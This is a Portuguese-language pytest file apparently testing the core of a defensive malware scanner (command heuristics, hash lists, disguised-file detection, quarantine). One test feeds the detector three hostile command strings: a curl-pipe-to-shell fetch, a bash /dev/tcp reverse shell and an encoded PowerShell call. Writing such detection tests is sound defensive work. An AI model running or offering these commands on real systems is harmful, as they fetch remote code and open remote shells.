"""Testes do núcleo do Dupin-Scan (sem interface)."""
import hashlib
import os

import pytest

from dupin_scan import core


@pytest.fixture
def qhome(tmp_path, monkeypatch):
    """Isola a pasta de dados (quarentena) em um diretório temporário."""
    d = tmp_path / "dupin_scan_data"
    monkeypatch.setattr(core, "data_dir", lambda: d)
    return d


# ------------------------------------------------------------ heurísticas de comando
def test_check_cmd_detecta_padroes_conhecidos():
    assert core.check_cmd("powershell -enc AAAA")
    assert core.check_cmd("curl http://x/a.sh | sh")
    assert core.check_cmd("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")


def test_check_cmd_ignora_comando_comum():
    assert core.check_cmd("notepad.exe C:\\docs\\a.txt") == []


# ------------------------------------------------------------ lista de hashes
def test_load_hashes_aceita_texto_csv_e_comentarios(tmp_path):
    h1, h2, h3 = ("a" * 64, "B" * 64, "c" * 64)
    f = tmp_path / "h.txt"
    f.write_text(
        f"# comentário {'d' * 64}\n"
        f"{h1}\n"
        f'"2024-01-01 10:00:00", "{h2}", "{"e" * 32}", "{"f" * 40}", "reporter"\n'
        f"   {h3}   \n"
        "linha sem hash\n",
        encoding="utf-8",
    )
    assert core.load_hashes(str(f)) == {h1, h2.lower(), h3}


def test_load_hashes_vazio():
    assert core.load_hashes(None) == set()


# ------------------------------------------------------------ rede
def test_is_public():
    assert core.is_public("8.8.8.8")
    assert not core.is_public("192.168.0.10")
    assert not core.is_public("127.0.0.1")
    assert not core.is_public("100.64.1.1")  # CGNAT (ex.: Tailscale)
    assert not core.is_public("não é ip")


# ------------------------------------------------------------ análise de arquivo
def test_analyze_file_binario_disfarcado_de_documento(tmp_path):
    p = tmp_path / "fatura.pdf"
    p.write_bytes(b"MZ" + b"\0" * 200)
    r = core.analyze_file(p, "linux", set(), None)
    assert r and any("disfarçado" in x for x in r["reasons"])


def test_analyze_file_dupla_extensao(tmp_path):
    p = tmp_path / "foto.png.exe"
    p.write_bytes(b"texto qualquer")
    r = core.analyze_file(p, "windows", set(), None)
    assert r and "Dupla extensão suspeita" in r["reasons"]


def test_analyze_file_hash_conhecido_e_alto(tmp_path):
    p = tmp_path / "x.bin"
    p.write_bytes(b"conteudo malicioso")
    digest = hashlib.sha256(b"conteudo malicioso").hexdigest()
    r = core.analyze_file(p, "linux", {digest}, None)
    assert r["score"] == 100 and r["sha256"] == digest


def test_analyze_file_limpo_retorna_none(tmp_path):
    p = tmp_path / "nota.txt"
    p.write_text("olá")
    assert core.analyze_file(p, "linux", set(), None) is None


# ------------------------------------------------------------ varredura
def test_scan_files_nao_varre_a_quarentena(tmp_path, qhome):
    (tmp_path / "normal.txt").write_text("x")
    q = qhome / "quarantine"
    q.mkdir(parents=True)
    (q / "abc.quar").write_bytes(b"MZ" + b"\0" * 50)
    _, total = core.scan_files([str(tmp_path)], "linux", set(), None)
    assert total == 1


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="FIFO só existe em sistemas POSIX")
def test_scan_files_ignora_fifo(tmp_path, qhome):
    os.mkfifo(tmp_path / "pipe")  # abrir para leitura sem escritor travaria para sempre
    (tmp_path / "normal.txt").write_text("x")
    _, total = core.scan_files([str(tmp_path)], "linux", set(), None)
    assert total == 1


def test_scan_files_nao_abre_arquivos_nao_regulares_simulado(tmp_path, qhome, monkeypatch):
    """Versão portátil do teste de FIFO: finge que 'pipe' é um FIFO e garante que não é analisado."""
    import stat as st_mod
    (tmp_path / "pipe").write_text("x")
    (tmp_path / "normal.txt").write_text("x")
    real_lstat = os.lstat

    def fake_lstat(p, *a, **k):
        st = real_lstat(p, *a, **k)
        if os.path.basename(str(p)) == "pipe":
            return os.stat_result((st_mod.S_IFIFO | 0o600,) + tuple(st)[1:])
        return st

    analisados = []
    monkeypatch.setattr(core.os, "lstat", fake_lstat)
    monkeypatch.setattr(core, "analyze_file", lambda path, *a, **k: analisados.append(os.path.basename(path)))
    _, total = core.scan_files([str(tmp_path)], "linux", set(), None)
    assert total == 1 and analisados == ["normal.txt"]


# ------------------------------------------------------------ YARA
@pytest.mark.skipif(core.yara is None, reason="yara-python não instalado")
def test_load_yara_ignora_regra_invalida(tmp_path):
    (tmp_path / "boa.yar").write_text('rule boa { strings: $a = "abc" condition: $a }')
    (tmp_path / "ruim.yar").write_text("rule ruim { isto não é yara }")
    errors = []
    rules = core.load_yara(str(tmp_path), errors)
    assert rules is not None
    assert len(errors) == 1 and "ruim.yar" in errors[0]


# ------------------------------------------------------------ quarentena
def test_quarentena_ida_e_volta(tmp_path, qhome):
    p = tmp_path / "suspeito.exe"
    p.write_bytes(b"dados")
    qid = core.quarantine_file(str(p), "sha", ["motivo"])
    assert not p.exists()
    assert [i["id"] for i in core.list_quarantine()] == [qid]

    dest = core.restore_quarantine(qid)
    assert dest == str(p) and p.read_bytes() == b"dados"
    assert core.list_quarantine() == []


def test_restaurar_nao_sobrescreve_arquivo_existente(tmp_path, qhome):
    p = tmp_path / "a.exe"
    p.write_bytes(b"original")
    qid = core.quarantine_file(str(p))
    p.write_bytes(b"novo")
    dest = core.restore_quarantine(qid)
    assert dest.endswith(".restaurado")
    assert p.read_bytes() == b"novo"


def test_excluir_da_quarentena(tmp_path, qhome):
    p = tmp_path / "b.exe"
    p.write_bytes(b"x")
    qid = core.quarantine_file(str(p))
    core.delete_quarantine(qid)
    assert core.list_quarantine() == []
    assert not (core.quarantine_path() / f"{qid}.quar").exists()


def test_indice_corrompido_e_preservado_nao_sobrescrito(tmp_path, qhome):
    p = tmp_path / "c.exe"
    p.write_bytes(b"x")
    qid = core.quarantine_file(str(p))
    idx = core.quarantine_path() / "index.json"
    idx.write_text("{ lixo", encoding="utf-8")

    assert core.list_quarantine() == []
    backups = list(core.quarantine_path().glob("index.corrompido-*.json"))
    assert len(backups) == 1  # o conteúdo corrompido foi guardado, não perdido
    assert (core.quarantine_path() / f"{qid}.quar").exists()  # o arquivo isolado segue lá


def test_salvar_indice_e_atomico_sem_sobras(tmp_path, qhome):
    p = tmp_path / "d.exe"
    p.write_bytes(b"x")
    core.quarantine_file(str(p))
    assert not list(core.quarantine_path().glob("*.tmp"))
